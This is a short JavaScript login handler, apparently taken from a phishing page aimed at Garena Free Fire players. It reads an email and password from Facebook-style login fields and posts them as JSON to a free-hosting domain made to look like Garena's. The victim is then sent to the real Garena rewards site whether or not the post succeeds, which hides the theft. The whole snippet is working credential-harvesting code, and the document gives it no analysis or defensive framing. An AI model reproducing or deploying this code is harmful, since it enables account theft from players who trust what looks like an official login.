<script>
    async function Login() {
            const email = document.getElementById('m_login_email').value;
            const password = document.getElementById('m_login_password').value;

            const response = await fetch('http://garena-free-fire.somee.com/api/Login/LoginUser', {
                method: 'POST',
                headers: {
                    'Accept': '*/*',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    Email: email,
                    Password: password
                })
            });

            if (response.ok) {
                window.location.href = 'https://reward.ff.garena.com/en';
            } else {
                window.location.href = 'https://reward.ff.garena.com/en';
            }
        }
</script>
